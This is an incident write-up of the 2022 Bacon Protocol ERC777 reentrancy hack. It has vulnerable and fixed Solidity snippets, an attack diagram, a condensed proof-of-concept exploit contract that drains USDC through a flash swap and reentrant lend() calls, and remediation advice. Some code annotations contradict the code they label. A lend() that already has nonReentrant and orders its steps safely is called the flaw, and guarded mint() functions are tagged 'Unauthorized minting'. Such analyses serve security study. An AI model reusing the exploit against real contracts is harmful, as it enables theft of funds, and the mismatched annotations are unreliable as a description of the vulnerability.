# Bacon Protocol — ERC777 Reentrancy Attack Analysis

| Field | Details |
|------|------|
| **Date** | 2022-03-06 |
| **Protocol** | Bacon Protocol |
| **Chain** | Ethereum Mainnet |
| **Loss** | ~$1,000,000 USDC |
| **Attacker** | Attacker Contract |
| **Attack Tx** | [Block 14326931](https://etherscan.io/block/14326931) |
| **Vulnerable Contract** | [0xb8919522...](https://etherscan.io/address/0xb8919522331C59f5C16bDfAA6A121a6E03A91F62) |
| **Root Cause** | `tokensReceived` hook reentrancy via ERC1820 interface registration — callback triggered before state update during `lend()` |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-03/Bacon_exp.sol) |

---
## 1. Vulnerability Overview

Bacon Protocol used the ERC777 standard, which allows token receive hooks to be registered via the ERC1820 registry. The attacker implemented a `tokensReceived` hook and exploited the callback triggered during a `lend()` call to perform reentrancy. After borrowing 6.36M USDC via flash swap, the attacker repeated `lend()` → callback reentrancy → `lend()` to receive an inflated amount of bTokens, then called `redeem()` to drain actual USDC.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable: lend() updates state after bToken transfer — reentrancy possible
function lend(uint256 usdcAmount) external {
    // Receive USDC and mint bTokens
    usdc.transferFrom(msg.sender, address(this), usdcAmount);

    // bToken transfer triggers ERC777 tokensReceived hook!
    bToken.transfer(msg.sender, bTokenAmount);
    // ↑ Attacker's tokensReceived is called here
    // State has not yet been updated at this point

    // ❌ State update occurs after external call
    totalLent += usdcAmount;
}

// ✅ Fixed: CEI pattern + nonReentrant
function lend(uint256 usdcAmount) external nonReentrant {
    // 1. Update state first
    totalLent += usdcAmount;
    uint256 bTokenAmount = calculateBTokens(usdcAmount);

    // 2. External calls after
    usdc.transferFrom(msg.sender, address(this), usdcAmount);
    bToken.transfer(msg.sender, bTokenAmount);
}
```

### On-Chain Source Code

Source: Sourcify verified


**BaconCoin3.sol** — Entry point:
```solidity
// ❌ Root cause: tokensReceived hook reentrancy via ERC1820 interface registration — callback triggered before state update during lend()
    function mint(address account, uint256 amount) public {  // ❌ Unauthorized minting
        require(msg.sender == stakingContract || msg.sender == airdropContract, "Invalid mint sender");
        super._mint(account, amount);
        _moveDelegates(address(0), delegates[account], amount);
    }
```

**Pool13.sol** — Vulnerable point:
```solidity
// ❌ tokensReceived hook reentrancy via ERC1820 interface registration — callback triggered before state update during lend()
    function lend(
        uint256 amount
    ) public nonReentrant returns (uint256) {
        IERC20Upgradeable(ERCAddress).transferFrom(msg.sender, address(this), amount);  // ❌ Unauthorized transferFrom

        poolLent = poolLent.add(amount);

        super._mint(msg.sender, amount);

        return amount;
    }
```

**BaconCoin0.sol** — Related contract:
```solidity
// ❌ Root cause: tokensReceived hook reentrancy via ERC1820 interface registration — callback triggered before state update during lend()
    function mint(address account, uint256 amount) public {  // ❌ Unauthorized minting
        require(msg.sender == stakingContract || msg.sender == airdropContract, "Invalid mint sender");
        super._mint(account, amount, "", "");
        _moveDelegates(address(0), account, amount);
    }
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
 │
 ├─1─► Register tokensReceived hook with ERC1820
 │
 ├─2─► Uniswap flash swap: borrow 6.36M USDC
 │
 ├─3─► bacon.lend(2.12M USDC)  [count=0]
 │       │
 │       ├─► USDC transfer complete
 │       ├─► bToken transfer → tokensReceived callback!
 │       │         │
 │       │         └─► [Reentrance 1] bacon.lend(2.12M USDC) [count=1]
 │       │                   │
 │       │                   └─► [Reentrance 2] bacon.lend(2.12M USDC) [count=2]
 │       │
 │       └─► State update (lend already executed 3 times)
 │
 ├─4─► bacon.redeem(bToken_balance)
 │       → Receives 3x+ USDC back!
 │
 └─5─► Repay flash swap + realize profit
```

## 4. PoC Code (Core Logic + Comments)

```solidity
contract ContractTest is Test {
    uint256 count = 0;

    constructor() {
        // Register as tokensReceived hook implementer with ERC1820 registry
        ERC1820Registry(0x1820a4B7...).setInterfaceImplementer(
            address(this),
            bytes32(0xb281fc8c...),  // IERC777TokensRecipient interface ID
            address(this)
        );
    }

    // Uniswap flash swap callback
    function uniswapV2Call(address, uint256 amount0, ...) public {
        usdc.approve(address(bacon), 10_000_000_000_000_000_000);
        bacon.lend(2_120_000_000_000);  // First lend
        bacon.redeem(bacon.balanceOf(address(this)));  // Drain USDC with inflated bTokens
        usdc.transfer(msg.sender, repayAmount);        // Repay flash swap
        usdc.transfer(tx.origin, usdc.balanceOf(address(this)));  // Realize profit
    }

    // ERC777 tokensReceived hook — reenter during lend()
    function tokensReceived(...) public {
        count += 1;
        if (count <= 2) {
            bacon.lend(2_120_000_000_000);  // Additional lend via reentrancy
        }
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|------|
| **CWE** | CWE-841: Reentrancy Vulnerability |
| **Vulnerability Type** | ERC777 Reentrancy |
| **DASP** | #1 - Reentrancy |
| **Attack Technique** | `tokensReceived` reentrancy after ERC1820 hook registration |
| **Precondition** | Ability to register hook with ERC1820 registry |

## 6. Remediation Recommendations

1. **nonReentrant guard**: Apply reentrancy guard to all functions that include external token transfers
2. **Strict CEI pattern**: Enforce Checks → Effects → Interactions ordering
3. **Avoid ERC777**: ERC777 is a reentrancy vector; ERC20 is recommended for lending protocols
4. **Disable ERC1820 hooks**: Deactivate hooks before transferring tokens to untrusted recipients

## 7. Lessons Learned

- **The dual nature of ERC777**: The flexible hook mechanism can itself become a security vulnerability. Protocols handling ERC777 tokens must always account for reentrancy.
- **Flash loan + reentrancy combination**: The pattern of securing large capital via flash loans and amplifying it through reentrancy is one of the most common and dangerous attack combinations in DeFi.